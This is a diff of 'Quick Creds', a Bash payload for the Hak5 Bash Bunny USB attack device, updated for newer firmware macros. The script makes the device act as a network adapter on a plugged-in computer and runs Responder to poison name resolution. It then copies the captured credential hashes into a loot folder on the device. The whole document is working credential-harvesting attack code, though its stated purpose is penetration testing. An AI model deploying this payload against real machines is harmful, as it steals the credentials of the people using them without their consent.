@@ -3,37 +3,35 @@
 # Title:         Quick Creds
 # Author:        Hak5Darren -- Cred: Mubix
 # Version:       1.0
+# Firmware:      >= 1.1
 #
 # Runs responder against target with specified options
 # Saves sequential logs to mass storage loot folder
 #
-# Requires responder in /pentest/responder - run tools_installer payload first
+# Requires responder in /tools/responder
 #
-# White Blinking.....Dependencies not met. Responder not installed in /pentest
-# Red ...............Setup
-# Red Blinking.......Setup Failed. Target did not obtain IP address. Exit.
-# Amber Blinking.....Scanning
-# Green..............Finished
+# | Status              | Description                              |
+# | ------------------- | ---------------------------------------- |
+# | FAIL1               | Responder not found at /tools/responder  |
+# | FAIL2               | Target did not aquire IP address         |
 # 
 # Options
 RESPONDER_OPTIONS="-w -r -d -P"
 LOOTDIR=/root/udisk/loot/quickcreds
 
-# Check for responder. If not found, blink WHITE and end.
-if [ ! -d /pentest/responder/ ]; then
-  LED R G B 100
-  exit 1
-fi
+# Check for responder
+REQUIRETOOL responder
 
-# Set LED Red while setting up attack
-LED R
+# Setup Attack
+LED SETUP
 
 # Use RNDIS for Windows. Mac/*nix use ECM_ETHERNET
 ATTACKMODE RNDIS_ETHERNET 
 #ATTACKMODE ECM_ETHERNET
 
-# Source bunny_helpers.sh for functions & variables TARGET_IP, TARGET_HOSTNAME
-source bunny_helpers.sh
+# Set convenience variables
+GET TARGET_HOSTNAME
+GET TARGET_IP
 
 # Setup named logs in loot directory
 mkdir -p $LOOTDIR
@@ -49,13 +47,13 @@ mkdir -p /root/loot/quickcreds/$HOST-$COUNT
 
 # Check target IP address. If unset, blink RED and end.
 if [ -z "${TARGET_IP}" ]; then
-    LED R 100
+    LED FAIL2
 	exit 1
 fi
 
 # Set LED yellow, run attack
-LED G R 500
-cd /pentest/responder
+LED ATTACK
+cd /tools/responder
 
 # Clean logs directory
 rm logs/*
@@ -78,4 +76,4 @@ cp logs/* $LOOTDIR/$HOST-$COUNT
 sync
 
 # Light turns green - trap is clean.
-LED G
+LED FINISH
